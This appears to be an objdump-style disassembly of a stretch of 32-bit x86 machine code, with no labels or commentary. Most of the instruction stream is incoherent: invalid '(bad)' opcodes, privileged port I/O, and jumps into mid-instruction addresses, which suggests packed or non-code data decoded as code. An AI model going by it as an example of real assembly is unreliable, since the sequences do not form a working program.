  40b2e7:	cli    
  40b2e8:	jmp    0x40b31f
  40b2ea:	mov    DWORD PTR [esi],esi
  40b2ec:	push   esi
  40b2ed:	cmp    al,0xe3
  40b2ef:	inc    edx
  40b2f0:	stc    
  40b2f1:	repnz dec ecx
  40b2f3:	add    BYTE PTR [esi],bh
  40b2f5:	xchg   esi,eax
  40b2f6:	push   ebx
  40b2f7:	add    BYTE PTR [esi],ah
  40b2f9:	mov    edx,0x3fea2e64
  40b2fe:	das    
  40b2ff:	pop    edi
  40b300:	mov    esi,0x5600277c
  40b305:	into   
  40b306:	sub    al,0x0
  40b308:	pop    esi
  40b309:	(bad)  
  40b30a:	xor    eax,0x32d24600
  40b30f:	add    BYTE PTR [esi+0xa],cl
  40b312:	lods   eax,DWORD PTR ds:[esi]
  40b313:	add    al,0x95
  40b315:	rcl    BYTE PTR [ebx-0x49125195],cl
  40b31b:	mov    al,0x35
  40b31d:	test   al,0xfe
  40b31f:	lahf   
  40b320:	add    al,0x6c
  40b322:	sahf   
  40b323:	nop
  40b324:	aas    
  40b325:	add    eax,0xb0b0b6c
  40b32a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  40b32c:	xor    al,0x9e
  40b32e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b32f:	(bad)  
  40b330:	clc    
  40b331:	cwde   
  40b332:	lods   eax,DWORD PTR ds:[esi]
  40b333:	test   DWORD PTR [edi],ebp
  40b335:	cs cs jnp 0x40b3b0
  40b339:	ins    BYTE PTR es:[edi],dx
  40b33a:	cmp    dh,BYTE PTR [ecx]
  40b33c:	cdq    
  40b33d:	jl     0x40b35a
  40b33f:	sbb    ebp,ebp
  40b341:	repnz push ss
  40b343:	pop    esp
  40b344:	add    BYTE PTR [edx-0x276dc3e1],ah
  40b34a:	push   ecx
  40b34b:	cmp    DWORD PTR [esi+ebx*8+0x511005f8],esi
  40b352:	pushf  
  40b353:	and    ecx,DWORD PTR [ecx]
  40b355:	daa    
  40b356:	add    dh,al
  40b358:	cs adc eax,0xb0585f96
  40b35e:	add    bh,cl
  40b360:	lods   eax,DWORD PTR ds:[esi]
  40b361:	test   al,0x13
  40b363:	push   ebx
  40b364:	fs jbe 0x40b31b
  40b367:	ins    DWORD PTR es:[edi],dx
  40b368:	mov    ebx,0x5d5c62d4
  40b36d:	fwait
  40b36e:	loopne 0x40b310
  40b370:	jp     0x40b3b4
  40b372:	bound  esi,QWORD PTR [ebp-0x1b92d250]
  40b378:	dec    edi
  40b379:	mov    edi,0x284020fc
  40b37e:	add    dl,BYTE PTR ds:0xd0b6c6db
  40b384:	and    al,0x50
  40b386:	push   cs
  40b387:	jnp    0x40b33b
  40b389:	sahf   
  40b38a:	repnz fcmovnu st,st(2)
  40b38d:	ins    DWORD PTR es:[edi],dx
  40b38e:	stos   DWORD PTR es:[edi],eax
  40b38f:	xor    ebx,ecx
  40b391:	pusha  
  40b392:	push   ebx
  40b393:	loop   0x40b33b
  40b395:	add    bl,BYTE PTR [esp+eiz*4+0x62]
  40b399:	push   ss
  40b39a:	mov    dh,0x6d
  40b39c:	imul   edx,DWORD PTR [edx+0x28],0xffffffad
  40b3a0:	into   
  40b3a1:	shl    BYTE PTR [eax],cl
  40b3a3:	ret    0xca10
  40b3a6:	gs push 0xb862db6b
  40b3ac:	es dec ebp
  40b3ae:	sub    eax,ecx
  40b3b0:	mov    al,0xba
  40b3b2:	sub    al,0xff
  40b3b4:	mov    dl,0xdf
  40b3b6:	mov    eax,0xd700183f
  40b3bb:	sahf   
  40b3bc:	add    BYTE PTR [edx-0x3bd7de57],ch
  40b3c2:	(bad)  
  40b3c3:	inc    ecx
  40b3c4:	lahf   
  40b3c5:	setp   BYTE PTR [ecx]
  40b3c8:	xchg   edi,eax
  40b3c9:	loop   0x40b36f
  40b3cb:	xor    al,BYTE PTR ss:[ecx]
  40b3ce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b3cf:	mov    dh,0x67
  40b3d1:	jmp    0x10d86f20
  40b3d6:	retf   
  40b3d7:	add    bh,BYTE PTR [ebx]
  40b3d9:	sbb    edi,esi
  40b3db:	outs   dx,BYTE PTR ds:[esi]
  40b3dc:	inc    ebp
  40b3dd:	test   DWORD PTR [edi+0x5b],esi
  40b3e0:	mov    edx,0x374035b0
  40b3e5:	je     0x40b3d2
  40b3e7:	add    al,0xef
  40b3e9:	inc    ebp
  40b3ea:	jecxz  0x40b3bf
  40b3ec:	ds pop ebx
  40b3ee:	pop    ebx
  40b3ef:	jmp    0x40b433
  40b3f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b3f2:	fcmovnu st,st(0)
  40b3f4:	jbe    0x40b413
  40b3f6:	ret    
  40b3f7:	and    al,bh
  40b3f9:	fcomp  st(2)
  40b3fb:	lods   eax,DWORD PTR ds:[esi]
  40b3fc:	scas   eax,DWORD PTR es:[edi]
  40b3fd:	pop    eax
  40b3fe:	pop    ds
  40b3ff:	stc    
  40b400:	mov    ebx,0xbf62c086
  40b405:	lea    esi,[ecx-0x4da481ac]
  40b40b:	mov    esi,edi
  40b40d:	xchg   ebp,eax
  40b40e:	test   eax,0x5f349100
  40b413:	(bad)  [ebp-0x3c4f4493]
  40b419:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b41a:	adc    BYTE PTR [ecx+0x6e978f02],ah
  40b420:	sbb    esp,DWORD PTR [ebx+0x56]
  40b423:	mov    edx,0xf1566db5
  40b428:	adc    DWORD PTR [esi+0x5c106113],edi
  40b42e:	sahf   
  40b42f:	mov    eax,ds:0xc7dbb52d
  40b434:	add    eax,0x8c2f2a7b
  40b439:	mov    ch,0x53
  40b43b:	jmp    0x40f0c18b
  40b440:	out    0x9b,eax
  40b442:	or     BYTE PTR fs:[ecx-0x64e548c4],0x8a
  40b44a:	in     al,dx
  40b44b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b44c:	push   eax
  40b44d:	hlt    
  40b44e:	xchg   DWORD PTR [ebp-0x49c803d8],esi
  40b454:	xchg   esi,eax
  40b455:	or     dl,BYTE PTR [ebp-0x5c]
  40b458:	mov    esp,0xd693d137
  40b45d:	data16 jo 0x40b401
  40b460:	sub    eax,0xf40d416c
  40b465:	mov    eax,ds:0x7512973b
  40b46a:	gs stc 
  40b46c:	inc    esi
  40b46d:	inc    ebx
  40b46e:	ja     0x40b464
  40b470:	xchg   ebx,eax
  40b471:	cmp    dh,BYTE PTR [edi+0x0]
  40b474:	int    0xec
  40b476:	arpl   WORD PTR [ebx-0x6a],bx
  40b479:	(bad)  
  40b47a:	(bad)  
  40b47b:	stos   DWORD PTR es:[edi],eax
  40b47c:	xor    al,0xdf
  40b47e:	cmp    eax,0xcb93e708
  40b483:	(bad)  
  40b484:	mov    dl,0x7c
  40b486:	call   0x1850b522
  40b48b:	sbb    DWORD PTR [ebx+0x68d902d0],ebp
  40b491:	xor    BYTE PTR [esi+0x7e838c87],0xe2
  40b498:	xchg   ebx,eax
  40b499:	ds pop ecx
  40b49b:	xchg   esi,eax
  40b49c:	lea    esp,[ebp-0x15]
  40b49f:	or     ch,BYTE PTR [ebx-0x540ad304]
  40b4a5:	mov    eax,0x9323637c
  40b4aa:	mov    ss,edx
  40b4ac:	add    BYTE PTR [edi+0x58],ah
  40b4af:	fbstp  TBYTE PTR [edi+0x42cb6c0f]
  40b4b5:	xor    ebx,ecx
  40b4b7:	mov    edx,0x6eaa3fc3
  40b4bd:	ins    DWORD PTR es:[edi],dx
  40b4be:	ins    BYTE PTR es:[edi],dx
  40b4bf:	sub    eax,0x5da31977
  40b4c4:	jb     0x40b4dc
  40b4c6:	ins    BYTE PTR es:[edi],dx
  40b4c7:	lds    ebp,FWORD PTR [esi+0x6d]
  40b4ca:	mov    al,0xd5
  40b4cc:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40b4ce:	out    dx,al
  40b4cf:	in     al,dx
  40b4d0:	rcl    al,0x17
  40b4d3:	in     eax,0x51
  40b4d5:	mov    edx,0xe9c036d5
  40b4da:	pop    edi
  40b4db:	cs xor ah,cl
  40b4de:	xchg   BYTE PTR [ebp+0xb6c2db],ah
  40b4e4:	push   edi
  40b4e5:	or     esp,DWORD PTR ds:0xd53c1724
  40b4ec:	xchg   BYTE PTR ds:0xd9fe56db,ch
  40b4f2:	add    BYTE PTR ds:0xe26d00de,dh
  40b4f8:	mov    edi,0xd22410f
  40b4fd:	das    
  40b4fe:	pop    edi
  40b4ff:	mov    edx,0x495b7db0
  40b504:	in     eax,0x5e
  40b506:	xlat   BYTE PTR ds:[ebx]
  40b507:	mov    esi,0xa58e0f00
  40b50c:	add    BYTE PTR [ebp-0x5e],cl
  40b50f:	mov    ah,0x83
  40b511:	xchg   esi,eax
  40b512:	test   eax,0x95605bad
  40b517:	pop    ecx
  40b518:	or     dh,BYTE PTR [edi+0x69f9ddad]
  40b51e:	popf   
  40b51f:	ror    DWORD PTR [ebx],1
  40b521:	jb     0x40b546
  40b523:	push   eax
  40b524:	mov    DWORD PTR [ebx],edx
  40b526:	push   ss
  40b527:	xchg   esi,eax
  40b528:	das    
  40b529:	frstor [eax]
  40b52b:	aas    
  40b52c:	dec    edx
  40b52d:	push   eax
  40b52e:	jne    0x40b530
  40b530:	std    
  40b531:	jns    0x40b5b0
  40b533:	mov    BYTE PTR [ecx+0x47],ah
  40b536:	or     esi,DWORD PTR ds:0x3f654916
  40b53c:	stos   BYTE PTR es:[edi],al
  40b53d:	xchg   edi,eax
  40b53e:	inc    eax
  40b53f:	loope  0x40b547
  40b541:	pop    ebp
  40b542:	inc    eax
  40b543:	push   ecx
  40b544:	mov    ds:0x5dde4781,al
  40b549:	cs jecxz 0x40b512
  40b54c:	ret    0x3946
  40b54f:	(bad)  
  40b550:	mov    ss,WORD PTR [ebx+0x3f4dc8a8]
  40b556:	in     eax,dx
  40b557:	push   esi
  40b558:	mov    ebx,0x35b1f144
  40b55d:	pop    edi
  40b55e:	test   DWORD PTR [edx-0x483561c3],edi
  40b564:	push   ss
  40b565:	mov    dh,0x21
  40b567:	lods   eax,DWORD PTR ds:[esi]
  40b568:	and    eax,0x2d7c29bb
  40b56d:	add    al,dh
  40b56f:	adc    eax,ebx
  40b571:	fiadd  DWORD PTR [ecx]
  40b573:	mov    bh,0xb5
  40b575:	leave  
  40b576:	sbb    DWORD PTR [edx+0x57c01c2],ecx
  40b57c:	aam    0xb6
  40b57e:	mov    al,0x55
  40b580:	mov    eax,0xd44380d3
  40b585:	retf   
  40b586:	jns    0x40b53a
  40b588:	sub    eax,0x2d4ebb5b
  40b58d:	stc    
  40b58e:	jno    0x40b54f
  40b590:	es imul ecx,ebx,0x3f
  40b594:	retf   
  40b595:	mov    dl,0x2c
  40b597:	fstp   TBYTE PTR [edi+edi*4+0x8]
  40b59b:	inc    ebp
  40b59c:	xor    DWORD PTR [esi+0x4f],ecx
  40b59f:	ins    DWORD PTR es:[edi],dx
  40b5a0:	pop    ss
  40b5a1:	push   0x24af52a8
  40b5a6:	push   edi
  40b5a7:	pop    ecx
  40b5a8:	into   
  40b5a9:	stos   BYTE PTR es:[edi],al
  40b5aa:	es mov dh,0x85
  40b5ad:	ins    DWORD PTR es:[edi],dx
  40b5ae:	mov    eax,ds:0xb3c1d9c5
  40b5b3:	or     eax,0x15c209d3
  40b5b8:	fmul   st,st(2)
  40b5ba:	push   ss
  40b5bb:	xchg   edi,eax
  40b5bc:	inc    edi
  40b5bd:	adc    DWORD PTR [edi+0x2505c327],esi
  40b5c3:	mov    dh,0xad
  40b5c5:	mov    ah,0x5d
  40b5c7:	scas   eax,DWORD PTR es:[edi]
  40b5c8:	and    DWORD PTR [edx+ecx*2+0x39d471e8],edi
  40b5cf:	out    dx,eax
  40b5d0:	cwde   
  40b5d1:	push   eax
  40b5d2:	mov    esi,0x3d4e376d
  40b5d7:	dec    BYTE PTR [eax]
  40b5d9:	push   ebx
  40b5da:	je     0x40b5df
  40b5dc:	add    BYTE PTR [eax+ebx*2-0x2b],dh
  40b5e0:	cs retf 
  40b5e2:	mov    dl,0x7f
  40b5e4:	fist   WORD PTR [ebx+0x418394c8]
  40b5ea:	mov    ah,0xed
  40b5ec:	shl    BYTE PTR [edx-0x4c0552ed],cl
  40b5f2:	push   esp
  40b5f3:	mov    bl,0xd7
  40b5f5:	nop
  40b5f6:	lods   eax,DWORD PTR gs:[esi]
  40b5f8:	mov    cl,0xa9
  40b5fa:	outs   dx,BYTE PTR ds:[esi]
  40b5fb:	inc    edx
  40b5fc:	mov    bh,0x63
  40b5fe:	pop    ss
  40b5ff:	out    0x7,al
  40b601:	test   al,0x2f
  40b603:	or     eax,0x9fb63636
  40b608:	add    cl,ch
  40b60a:	data16 mov BYTE PTR [edi+0x713c954d],bl
  40b611:	fcmovnu st,st(2)
  40b613:	dec    ecx
  40b614:	das    
  40b615:	mov    DWORD PTR [eax],ecx
  40b617:	inc    ecx
  40b618:	mov    esp,0x7585217d
  40b61d:	sub    eax,0x5a6c6e15
  40b622:	jno    0x40b669
  40b624:	ins    DWORD PTR es:[edi],dx
  40b625:	aaa    
  40b626:	sub    BYTE PTR [esi+0x65],ch
  40b629:	gs jecxz 0x40b602
  40b62c:	cmp    esp,DWORD PTR cs:[ecx-0x10]
  40b630:	xlat   BYTE PTR ds:[ebx]
  40b631:	fwait
  40b632:	test   al,0x92
  40b634:	imul   eax,edx,0x8d955cdc
  40b63a:	out    dx,al
  40b63b:	jne    0x40b618
  40b63d:	sahf   
  40b63e:	mov    al,gs:0xda068da1
  40b644:	add    DWORD PTR [edi+0x3b141276],ecx
  40b64a:	stc    
  40b64b:	retf   
  40b64c:	xchg   edi,eax
  40b64d:	mov    DWORD PTR gs:[edi+ebx*8+0x342dac24],eax
  40b655:	add    ch,dl
  40b657:	push   esi
  40b658:	sub    al,0xcb
  40b65a:	mov    dl,0x2c
  40b65c:	(bad)  
  40b65d:	pop    edi
  40b65e:	inc    ebp
  40b65f:	dec    eax
  40b660:	dec    edi
  40b661:	xchg   esi,eax
  40b662:	gs pop ecx
  40b664:	mov    esi,0x70001841
  40b669:	jp     0x40b6e5
  40b66b:	jae    0x40b6cc
  40b66d:	pop    edi
  40b66e:	mov    eax,0x516c597c
  40b673:	add    BYTE PTR [eax],al
  40b675:	gs stos BYTE PTR es:[edi],al
  40b677:	clc    
  40b678:	jbe    0x40b66e
  40b67a:	add    BYTE PTR [eax+esi*8+0x28db63ad],bl
  40b681:	lea    ecx,[ebp+ebx*8-0x3d1f6670]
  40b688:	repnz (bad) 
  40b68a:	ret    0xbff2
  40b68d:	add    BYTE PTR [eax-0x50],dh
  40b690:	mov    ch,0x2b
  40b692:	aas    
  40b693:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b694:	scas   al,BYTE PTR es:[edi]
  40b695:	add    BYTE PTR [ecx+0x5f],ah
  40b698:	mov    esi,0x27bfcb2c
  40b69d:	enter  0xdb40,0x0
  40b6a1:	mov    cl,0x61
  40b6a3:	rol    DWORD PTR [eax],cl
  40b6a5:	mov    edx,0x2cb2cb2c
  40b6aa:	jp     0x40b651
  40b6ac:	imul   esp,DWORD PTR [eax-0x1f20d098],0xffffffb2
  40b6b3:	cdq    
  40b6b4:	pop    ds
  40b6b5:	repz add dh,bh
  40b6b8:	add    BYTE PTR [eax-0x61ffc01d],dl
  40b6be:	lods   eax,DWORD PTR ds:[esi]
  40b6bf:	(bad)  [edx-0x2ae2446b]
  40b6c5:	sub    WORD PTR [esi-0x268eddb5],sp
  40b6cc:	mov    dh,0xf2
  40b6ce:	xlat   BYTE PTR ds:[ebx]
  40b6cf:	add    BYTE PTR [esi],ah
  40b6d1:	xchg   ebx,eax
  40b6d2:	inc    ecx
  40b6d3:	das    
  40b6d4:	lds    esi,FWORD PTR [ebp+edi*4-0x1d]
  40b6d8:	ins    BYTE PTR es:[edi],dx
  40b6d9:	retf   
  40b6da:	push   esi
  40b6db:	mov    esi,0xb600ef1b
  40b6e0:	jmp    0x40b717
  40b6e2:	mov    ds:0x81a4415f,eax
  40b6e7:	lods   eax,DWORD PTR ds:[esi]
  40b6e8:	mov    ds:0xb8677b6e,eax
  40b6ed:	int3   
  40b6ee:	ds mov esp,esi
  40b6f1:	sbb    DWORD PTR [ebx-0x42],0x5f0376c0
  40b6f8:	es inc ebx
  40b6fa:	sub    dl,dh
  40b6fc:	add    BYTE PTR [ebp-0x2f],bh
  40b6ff:	js     0x40b70f
  40b701:	fsubr  DWORD PTR [eax]
  40b703:	push   esp
  40b704:	arpl   WORD PTR [edx+ecx*4+0x6bd1398e],bp
  40b70b:	retf   
  40b70c:	aaa    
  40b70d:	call   0x7f671d30
  40b712:	add    BYTE PTR [edx],cl
  40b714:	outs   dx,DWORD PTR ds:[esi]
  40b715:	pop    es
  40b716:	pop    ecx
  40b717:	pop    edi
  40b718:	mov    esi,0xd274a17c
  40b71d:	inc    edi
  40b71e:	pop    ecx
  40b71f:	jg     0x40b6fc
  40b721:	lea    eax,[eax]
  40b723:	sub    ah,al
  40b725:	xchg   BYTE PTR [eax],al
  40b727:	and    ebx,ebx
  40b729:	test   DWORD PTR [ebp+0x59],ebp
  40b72c:	int    0x1e
  40b72e:	add    bh,al
  40b730:	retf   0x73c9
  40b733:	or     ecx,DWORD PTR [ebp+0x4b2da376]
  40b739:	push   ebx
  40b73a:	push   0xc6602c96
  40b73f:	out    0xef,al
  40b741:	sub    al,0x6c
  40b743:	mov    bh,0xc2
  40b745:	push   ds
  40b746:	mov    ebx,0xfe1755ec
  40b74b:	bnd jg 0x40b75a
  40b74e:	or     eax,0xd2b28dd0
  40b753:	sub    eax,0xa1e36c59
  40b758:	pop    ecx
  40b759:	push   ss
  40b75a:	mov    dh,0x1b
  40b75c:	jle    0x40b78b
  40b75e:	sub    eax,DWORD PTR [esi+0x72307f10]
  40b764:	fcmovnbe st,st(6)
  40b766:	xchg   esi,eax
  40b767:	cmp    DWORD PTR gs:[ebx-0x6ee5283a],ecx
  40b76e:	ret    0xdde6
  40b771:	xchg   esi,eax
  40b772:	outs   dx,DWORD PTR ds:[esi]
  40b773:	or     ecx,DWORD PTR [edx]
  40b775:	push   edx
  40b776:	stos   BYTE PTR es:[edi],al
  40b777:	xchg   esp,eax
  40b778:	fild   DWORD PTR [eax]
  40b77a:	pop    ebx
  40b77b:	test   BYTE PTR [esp+ebp*2-0x3f],dh
  40b77f:	in     eax,0xdb
  40b781:	ins    DWORD PTR es:[edi],dx
  40b782:	stos   DWORD PTR es:[edi],eax
  40b783:	jp     0x40b7a1
  40b785:	cmp    eax,0xd7269b2c
  40b78a:	fld    QWORD PTR [eax]
  40b78c:	push   ebp
  40b78d:	call   0xfd17:0x6db4d6a5
  40b794:	jp     0x40b7e6
  40b796:	push   0xb67450ab
  40b79b:	jne    0x40b7dd
  40b79d:	mov    bh,0xff
  40b79f:	das    
  40b7a0:	inc    edx
  40b7a1:	mov    al,0xa0
  40b7a3:	dec    ebx
  40b7a4:	mov    ecx,esp
  40b7a6:	pop    ss
  40b7a7:	mov    dl,0xb0
  40b7a9:	ins    BYTE PTR es:[edi],dx
  40b7aa:	fstp   TBYTE PTR [edx+eax*1+0x39]
  40b7ae:	cmc    
  40b7af:	jne    0x40b77d
  40b7b1:	sub    ebp,DWORD PTR [esi-0x48]
  40b7b4:	sub    eax,0x60d3cb6c
  40b7b9:	or     bl,ch
  40b7bb:	fstp   DWORD PTR [edx+0x5b6b16c8]
  40b7c1:	sub    ch,BYTE PTR [edi+ebx*8]
  40b7c4:	cmp    DWORD PTR [edi+0x0],ebp
  40b7c7:	sbb    eax,0xfe9d7673
  40b7cc:	adc    BYTE PTR [ecx],0xb8
  40b7cf:	mov    ch,0xa8
  40b7d1:	jbe    0x40b84f
  40b7d3:	add    ebx,DWORD PTR [esi+eax*8+0x17]
  40b7d7:	scas   eax,DWORD PTR es:[edi]
  40b7d8:	dec    edi
  40b7d9:	repnz in eax,0x1b
  40b7dc:	sbb    BYTE PTR [esp+ebx*2+0x5b570057],bl
  40b7e3:	pop    edi
  40b7e4:	add    BYTE PTR [eax+0x23],dl
  40b7e7:	ins    DWORD PTR es:[edi],dx
  40b7e8:	jmp    0x40b830
  40b7ea:	stc    
  40b7eb:	daa    
  40b7ec:	add    BYTE PTR [ecx],ch
  40b7ee:	sub    esi,DWORD PTR [esi]
  40b7f0:	and    dh,BYTE PTR [ebx]
  40b7f2:	dec    ebx
  40b7f3:	test   al,0xd1
  40b7f5:	mov    ebx,0xa4ad6eb5
  40b7fa:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b7fb:	mov    WORD PTR [edx-0xa],?
  40b7fe:	pop    es
  40b7ff:	pop    ecx
  40b800:	jns    0x40b7ff
  40b802:	push   0x51cdb696
  40b807:	mov    al,ds:0x6ad1fab0
  40b80c:	or     ecx,DWORD PTR [edi-0x24923bf0]
  40b812:	fst    QWORD PTR [ebx]
  40b814:	out    0xfe,al
  40b816:	sbb    dh,dl
  40b818:	(bad)  
  40b819:	(bad)  
  40b81a:	cs sub al,0x74
  40b81d:	mov    ebp,0xdcee52f6
  40b822:	jmp    0xdbb6:0xd629c870
  40b829:	(bad)  
  40b82a:	loop   0x40b84d
  40b82c:	sar    DWORD PTR [esi+edx*1-0x5533afc8],0x53
  40b834:	fcomp  DWORD PTR [edx+0x549db80]
  40b83a:	aaa    
  40b83b:	rcr    BYTE PTR [ecx],1
  40b83d:	inc    ebx
  40b83e:	mov    al,0x3b
  40b840:	fistp  DWORD PTR [eax+0x62]
  40b843:	fnsetpm(287 only) 
  40b845:	pop    edi
  40b846:	add    eax,0xb4e0432c
  40b84b:	(bad)
  40b84f:	jbe    0x40b8bc
  40b851:	in     al,dx
  40b852:	jae    0x40b838
  40b854:	mov    eax,0xb66b4a2f
  40b859:	fmul   DWORD PTR [ebp-0x71e9f1e5]
  40b85f:	aam    0x8c
  40b861:	in     eax,dx
  40b862:	in     eax,0x94
  40b864:	stos   DWORD PTR es:[edi],eax
  40b865:	in     eax,dx
  40b866:	mov    dh,0x50
  40b868:	xchg   esi,eax
  40b869:	jl     0x40b808
  40b86b:	mov    cs,WORD PTR [esi+0x749926a4]
  40b871:	jmp    0x40b813
  40b873:	lods   eax,DWORD PTR ds:[esi]
  40b874:	or     ebx,DWORD PTR [ebx+0x11]
  40b877:	or     bl,BYTE PTR [edi]
  40b879:	jle    0x40b8af
  40b87b:	add    eax,0x85b46d32
  40b880:	inc    edx
  40b881:	sahf   
  40b882:	sbb    DWORD PTR [edi+ebp*8+0x61],ecx
  40b886:	xor    eax,0x2c6db0b0
  40b88b:	mov    ecx,0x802d8431
  40b890:	and    al,0x82
  40b892:	and    eax,0x2d2db6c4
  40b897:	in     al,0x2e
  40b899:	into   
  40b89a:	ds dec ebp
  40b89c:	fstp   QWORD PTR [edi+ebx*4-0x7b]
  40b8a0:	gs pop ebx
  40b8a2:	push   0xbf80d0fe
  40b8a7:	fisttp QWORD PTR [ecx-0x72252584]
  40b8ad:	test   DWORD PTR [edi],ebp
  40b8af:	sbb    al,0xb2
  40b8b1:	scas   al,BYTE PTR es:[edi]
  40b8b2:	jo     0x40b8ed
  40b8b4:	or     ebx,DWORD PTR [esi+0x6d85da8d]
  40b8ba:	pop    ebx
  40b8bb:	add    dl,BYTE PTR [ecx-0x66192afb]
  40b8c1:	or     eax,0xd805dcbd
  40b8c6:	pop    eax
  40b8c7:	pop    eax
  40b8c8:	fisub  DWORD PTR [esi]
  40b8ca:	xchg   esi,eax
  40b8cb:	stos   BYTE PTR es:[edi],al
  40b8cc:	sub    cl,BYTE PTR [edi+0x54]
  40b8cf:	and    al,0xc7
  40b8d1:	fcmovnbe st,st(6)
  40b8d3:	inc    eax
  40b8d4:	fadd   QWORD PTR [edx+0x4d]
  40b8d7:	sti    
  40b8d8:	jmp    0x40b920
  40b8da:	repnz icebp 
  40b8dc:	out    0x60,al
  40b8de:	mov    ch,0xb1
  40b8e0:	ins    DWORD PTR es:[edi],dx
  40b8e1:	mov    ch,0xab
  40b8e3:	mov    ecx,0xba626907
  40b8e8:	push   DWORD PTR [edx+0x5b]
  40b8eb:	in     eax,dx
  40b8ec:	mov    dh,0xb1
  40b8ee:	and    eax,0xc57b18ad
  40b8f3:	xor    eax,DWORD PTR [esi-0x69e4bc35]
  40b8f9:	outs   dx,DWORD PTR ds:[esi]
  40b8fa:	ins    BYTE PTR es:[edi],dx
  40b8fb:	mov    ch,0x8f
  40b8fd:	push   0x16ffc201
  40b902:	sub    al,0x0
  40b904:	sbb    DWORD PTR [edi],0x59659659
  40b90a:	xchg   esi,eax
  40b90b:	sub    BYTE PTR [ecx+eiz*1-0x49249236],bl
  40b912:	ins    DWORD PTR es:[edi],dx
  40b913:	cmp    dl,BYTE PTR [edx-0x73ccd927]
  40b919:	lea    edx,[edi]
  40b91b:	test   DWORD PTR [edx],esi
  40b91d:	pop    ebx
  40b91e:	mov    ebx,0x9e1c8895
  40b923:	clc    
  40b924:	mov    cl,0x5c
  40b926:	pop    ecx
  40b927:	sbb    ch,BYTE PTR [esi]
  40b929:	push   es
  40b92a:	or     ecx,DWORD PTR [ebx+0x4b]
  40b92d:	pop    esp
  40b92e:	add    ebx,ebp
  40b930:	adc    al,0x22
  40b932:	cmp    ecx,DWORD PTR [edi-0x1c9c1226]
  40b938:	xor    al,0x32
  40b93a:	data16 jo 0x40b952
  40b93d:	adc    al,BYTE PTR ds:0x6d3b4a25
  40b943:	stc    
  40b944:	inc    esi
  40b945:	and    DWORD PTR [ebx+0x1b],ecx
  40b948:	pop    ecx
  40b949:	pop    ebx
  40b94a:	add    BYTE PTR [ebp+0x6a],dl
  40b94d:	inc    edi
  40b94e:	cmp    edx,ebx
  40b950:	mov    dh,0xda
  40b952:	dec    ebp
  40b953:	es ja  0x40b9a5
  40b956:	inc    ebp
  40b957:	bound  ebx,QWORD PTR [ecx-0x6f]
  40b95a:	fwait
  40b95b:	cli    
  40b95c:	loop   0x40b914
  40b95e:	inc    edi
  40b95f:	mov    eax,ds:0x4e16ad92
  40b964:	mov    ch,0x42
  40b966:	push   0x0
  40b968:	sub    BYTE PTR ds:0x5fdcb1b,ch
  40b96e:	in     al,0x3f
  40b970:	loope  0x40b9a8
  40b972:	adc    al,0x8d
  40b974:	jbe    0x40b919
  40b976:	fst    st(2)
  40b978:	stos   BYTE PTR es:[edi],al
  40b979:	call   0x1cf19ae9
  40b97e:	outs   dx,BYTE PTR ds:[esi]
  40b97f:	jle    0x40b94c
  40b981:	mov    bh,0xb6
  40b983:	mov    dh,0xb8
  40b985:	xor    bh,BYTE PTR [ebp-0x4ab04693]
  40b98b:	out    0x0,al
  40b98d:	mov    ebp,0x2e36d4b3
  40b992:	ins    BYTE PTR es:[edi],dx
  40b993:	push   ebx
  40b994:	mov    WORD PTR [edi-0x59e71554],gs
  40b99a:	xlat   BYTE PTR ds:[ebx]
  40b99b:	gs stc 
  40b99d:	shl    BYTE PTR [esi+0x2d0211f5],cl
  40b9a3:	mov    edi,0x3600281a
  40b9a8:	add    esi,DWORD PTR [edx+0x3f97cb2c]
  40b9ae:	or     al,0x1c
  40b9b0:	add    BYTE PTR [eax],al
  40b9b2:	xor    eax,0xb2cb3e09
  40b9b7:	sub    al,0xcb
  40b9b9:	adc    ah,BYTE PTR [edi]
  40b9bb:	sbb    esp,DWORD PTR [eax]
  40b9bd:	in     al,dx
  40b9be:	fldcw  WORD PTR [ebx+ecx*8]
  40b9c1:	mov    dl,0x2c
  40b9c3:	in     eax,0xd2
  40b9c5:	dec    bl
  40b9c7:	test   DWORD PTR [edx+0x61],0x37c4b0bb
  40b9ce:	enter  0x80d8,0xd4
  40b9d2:	in     eax,0x10
  40b9d4:	mov    DWORD PTR [eax-0x23093d2c],edi
  40b9da:	fisub  DWORD PTR [ecx]
  40b9dc:	out    dx,eax
  40b9dd:	les    ebp,FWORD PTR [eax+0x59]
  40b9e0:	xchg   esi,eax
  40b9e1:	test   DWORD PTR [ebp+0x7f9471f8],ebp
  40b9e7:	sbb    DWORD PTR [ebp-0x69224b76],0x8f938665
  40b9f1:	out    0x9c,al
  40b9f3:	pushf  
  40b9f4:	cwde   
  40b9f5:	cwde   
  40b9f6:	adc    bl,BYTE PTR [ebx-0x7b]
  40b9f9:	mov    ds:0xaeac5acb,al
  40b9fe:	jg     0x40b9df
  40ba00:	mov    eax,0xb7a2cbfc
  40ba05:	test   BYTE PTR [eax],al
  40ba07:	stos   DWORD PTR es:[edi],eax
  40ba08:	add    BYTE PTR [eax],0xb0
  40ba0b:	pop    esp
  40ba0c:	js     0x40ba2c
  40ba0e:	je     0x40ba10
  40ba10:	push   ebp
  40ba11:	jo     0x40b9c0
  40ba13:	fstp   QWORD PTR [edx+0x28]
  40ba16:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ba17:	dec    esi
  40ba18:	scas   eax,DWORD PTR es:[edi]
  40ba19:	add    DWORD PTR [ebx],esp
  40ba1b:	jecxz  0x40b9af
  40ba1d:	stc    
  40ba1e:	ret    0xc2ad
  40ba21:	or     ah,BYTE PTR [edi+0x4f]
  40ba24:	shl    BYTE PTR [ebx],1
  40ba26:	scas   eax,DWORD PTR es:[edi]
  40ba27:	(bad)  
  40ba28:	stos   DWORD PTR es:[edi],eax
  40ba29:	add    BYTE PTR [edi+esi*8],bh
  40ba2c:	jno    0x40ba99
  40ba2e:	stc    
  40ba2f:	inc    edx
  40ba30:	call   0xfd2e:0x8900ff25
  40ba37:	repnz xor edx,0x6d
  40ba3b:	pop    ebx
  40ba3c:	mov    esi,0xfb008fab
  40ba41:	mov    edx,DWORD PTR [edi-0x60c46c65]
  40ba47:	add    ch,ah
